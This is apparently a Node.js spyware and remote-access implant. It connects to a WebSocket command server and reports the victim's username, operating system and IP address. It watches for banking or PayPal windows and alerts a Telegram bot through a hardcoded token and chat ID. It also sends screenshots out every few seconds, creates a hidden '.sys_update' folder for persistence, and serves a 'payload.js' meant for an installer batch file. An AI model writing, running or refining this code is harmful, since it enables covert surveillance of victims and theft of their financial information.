const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const http = require('http');

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app';
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;

// Persistence Logic
const persistDir = path.join(os.tmpdir(), '.sys_update');
if (!fs.existsSync(persistDir)) {
    fs.mkdirSync(persistDir);
}

function initConnection() {
    console.log(`Attempting to connect to ${WS_URL}...`);
    ws = new WebSocket(WS_URL);

    ws.on('open', () => {
        reconnectAttempts = 0; // Reset attempts on successful connection
        myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);

        console.log(`Connected with ID: ${myId}`);

        // Send info as a STRINGIFIED JSON object
        ws.send(JSON.stringify({
            type: 'info',
            id: myId,
            os: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            ip: getExternalIP()
        }));

        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'take_control') takeControl(true);
            else if (data.type === 'release_control') takeControl(false);
            else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
                handleSignaling(data);
            }
        } catch (e) {
            console.error("Error parsing message:", e);
        }
    });

    ws.on('close', (code, reason) => {
        console.log(`WebSocket closed. Code: ${code}, Reason: ${reason}`);
        reconnect();
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err.message);
        reconnect();
    });
}

function reconnect() {
    if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
        reconnectAttempts++;
        const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000); // Exponential backoff
        console.log(`Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
        setTimeout(initConnection, delay);
    } else {
        console.log("Max reconnection attempts reached.");
        keepAlive();
    }
}

function startMonitoring() {
    // Banking/Browser Sniffing
    setInterval(async () => {
        const title = await getCurrentWindowTitle();
        if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
            sendTelegram(`🏦 BANKING DETECTED: ${title}`);
            captureScreen();
        }
    }, 2000);

    // Continuous Screen Capture
    setInterval(() => {
        captureScreen();
    }, 5000);
}

function captureScreen() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;

    const imgPath = path.join(os.tmpdir(), 'screen.png');

    // Simplified screen capture command
    exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
        // If avfoundation fails, this fallback ensures no crash
        if (err && !fs.existsSync(imgPath)) {
            // Try macOS specific if needed
            exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
                if (!err2 && fs.existsSync(imgPath)) {
                    const img = fs.readFileSync(imgPath);
                    // FIX: Stringify the object before sending
                    ws.send(JSON.stringify({
                        type: 'screen_data',
                        id: myId,
                        data: img.toString('base64')
                    }));
                }
            });
        } else if (!err && fs.existsSync(imgPath)) {
            const img = fs.readFileSync(imgPath);
            // FIX: Stringify the object before sending
            ws.send(JSON.stringify({
                type: 'screen_data',
                id: myId,
                data: img.toString('base64')
            }));
        }
    });
}

async function getCurrentWindowTitle() {
    return new Promise((resolve) => {
        const platform = os.platform();
        let cmd = '';

        if (platform === 'win32') {
            cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
        } else if (platform === 'darwin') {
            cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
        } else {
            cmd = 'xdotool getwindowfocus getwindowname';
        }

        exec(cmd, (err, stdout) => {
            resolve(stdout.trim());
        });
    });
}

function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {}).on('error', (e) => {
        console.error("Telegram Error:", e.message);
    });
}

function getExternalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'unknown';
}

function takeControl(state) {
    console.log(`Take Control: ${state}`);
}

function handleSignaling(data) {
    // Implement RTCPeerConnection logic here if needed
    console.log("Received signaling data:", data);
}

function keepAlive() {
    // Prevent the process from exiting by keeping an interval alive
    setInterval(() => {}, 60000);
}

// --- RENDER WEB APP SERVER SETUP ---
const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
    // 1. Serve the payload.js file itself (for installer.bat)
    if (req.url === '/payload.js') {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
    } 
    // 2. Serve index.html if it exists (for frontend)
    else if (req.url === '/' || req.url === '/index.html') {
        const indexPath = path.join(__dirname, 'index.html');
        if (fs.existsSync(indexPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(fs.readFileSync(indexPath));
        } else {
            res.writeHead(404);
            res.end('index.html not found');
        }
    }
    // 3. Health Check
    else if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    } 
    // 4. Default response
    else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ 
            status: 'running', 
            id: myId || 'pending_connection',
            timestamp: new Date().toISOString()
        }));
    }
});

server.listen(PORT, () => {
    console.log(`HTTP Server listening on port ${PORT}`);
    // Start the WebSocket connection once the HTTP server is ready
    initConnection();
});

// Keep the process alive even if WebSocket fails
setInterval(() => {}, 60000);

// Export the handler for Vercel compatibility (optional if only using Render)
exports.handler = async (event, context) => {
    return {
        statusCode: 200,
        body: JSON.stringify({ status: 'running', id: myId })
    };
};
